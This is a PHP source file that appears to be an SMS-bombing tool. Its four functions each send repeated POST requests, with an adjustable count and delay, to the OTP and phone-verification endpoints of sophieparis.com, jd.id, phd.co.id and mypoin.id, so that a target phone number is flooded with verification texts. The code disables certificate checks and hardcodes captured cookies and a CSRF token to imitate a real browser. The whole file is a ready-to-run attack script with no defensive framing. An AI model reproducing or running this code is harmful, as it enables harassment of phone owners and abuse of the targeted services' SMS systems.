<?php
function sophie($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.sophieparis.com/iregistration/index/resendHpValidationCode/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"hp=".$no."");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.sophieparis.com/iregistration/member/revalidatesms/');
		$headers = array(); 
		$headers[] = "Authority: www.sophieparis.com";
		$headers[] = "Accept: */*";
		$headers[] = "X-Newrelic-Id: VQ8HV15WCBABV1RWDgcGUVM=";
		$headers[] = "Sec-Fetch-Dest: empty";
		$headers[] = "X-Requested-With: XMLHttpRequest"; 
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36";
		$headers[] = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"; 
		$headers[] = "Origin: https://www.sophieparis.com";
		$headers[] = "Sec-Fetch-Site: same-origin"; 
		$headers[] = "Sec-Fetch-Mode: cors"; 
		$headers[] = "Accept-Language: en-US,en;q=0.9"; 
		$headers[] = "Cookie: _ga=GA1.3.1653073049.1583108686; _gid=GA1.3.1507369321.1583108686; _hjid=c27f2024-b259-41fa-9ce9-73d8b5571b8f; toky_state=minimized; ins-gaSSId=e59f405d-6429-96d0-9eaf-2b92b66527a9_1583108691; _hjIncludedInSample=1; scarab.visitor=%222EAF352B0D1C530F%22; _fbp=fb.1.1583108698613.1373126036; frontend_cid=pimZ7VtcIRKBM2oi; am_promo_notification=0; frontend=laskgth5m8mkqfhjclgsilv9f0; MGT_NO_CACHE=1; insdrSV=11";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 
		$server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
 }   
}
function jdid($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&code=");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://passport.jd.id/register/phone');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
function phd($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.phd.co.id/en/users/sendOTP");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=".$no);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.phd.co.id/en/users/createnewuser');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
 }   
}
function mypoin($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://mypoin.id/register/request-otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&csrfmiddlewaretoken=IypPIPRj2PIzfpz5rFkX5m9rVVrloByb2TujqodLQx5vRWKGeB8VbUFkJrrPt1Hv");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
		$headers = array(); 
		$headers[] = "accept: application/json, text/javascript, */*; q=0.01";
		$headers[] = "accept-encoding: gzip, deflate, br";
		$headers[] = "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,tr;q=0.6";
		$headers[] = "content-length: 103";
		$headers[] = "content-type: application/x-www-form-urlencoded; charset=UTF-8";
		$headers[] = "cookie: __cfduid=d2ce4e486fc764c9ac34e1b99cfc58ed11583220645; csrftoken=ffOVR3YKRqPHH8h3Wa0pFdqYTLsswXRzzATpzCkcF8cDjFsEJ6OnLLWRHhsWBn0T; _ga=GA1.2.194179582.1583220646; _gid=GA1.2.503774749.1583220646; _gat_gtag_UA_108385159_1=1";
		$headers[] = "dnt: 1";
		$headers[] = "origin: https://mypoin.id";
		$headers[] = "referer: https://mypoin.id/register/validate-phone-number";
		$headers[] = "sec-fetch-dest: empty";
		$headers[] = "sec-fetch-mode: cors";
		$headers[] = "sec-fetch-site: same-origin";
		$headers[] = "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36";
		$headers[] = "x-requested-with: XMLHttpRequest";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 
		$server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
 }   
}
?>

